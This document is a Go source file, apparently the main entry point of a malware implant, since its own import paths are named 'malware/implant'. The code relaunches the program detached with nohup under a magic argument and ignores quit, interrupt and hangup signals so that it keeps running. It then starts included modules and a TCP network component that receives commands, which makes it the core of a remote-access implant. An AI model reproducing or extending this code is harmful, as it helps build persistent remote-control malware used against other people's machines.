package main

import (
	"fmt"
	"malware/implant/basic_tcp_network"
	"malware/implant/included_modules"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"syscall"
)

const NOHUP_ARG = "adfghj"

func main() {
	if runtime.GOOS != "windows" { // Windows doesnt kill children on parent death
		args := os.Args
		if len(args) < 2 || args[1] != NOHUP_ARG {
			fmt.Println("running " + args[0])
			cmd := exec.Command("bash", "-c", "nohup "+args[0]+" "+NOHUP_ARG+" &")
			err := cmd.Start()
			if err != nil {
				// idk just dont do anything?
				fmt.Println(err)
			}

			os.Exit(0)
		}
		signal.Ignore(syscall.SIGQUIT)
		signal.Ignore(syscall.SIGINT)
		signal.Ignore(syscall.SIGHUP)
	}

	defer func() {
		for _, module := range included_modules.Modules {
			module.Shutdown()
		}
	}()

	basic_tcp_network.Init() // Network is always last to init (Can't get commands until other modules started)
}
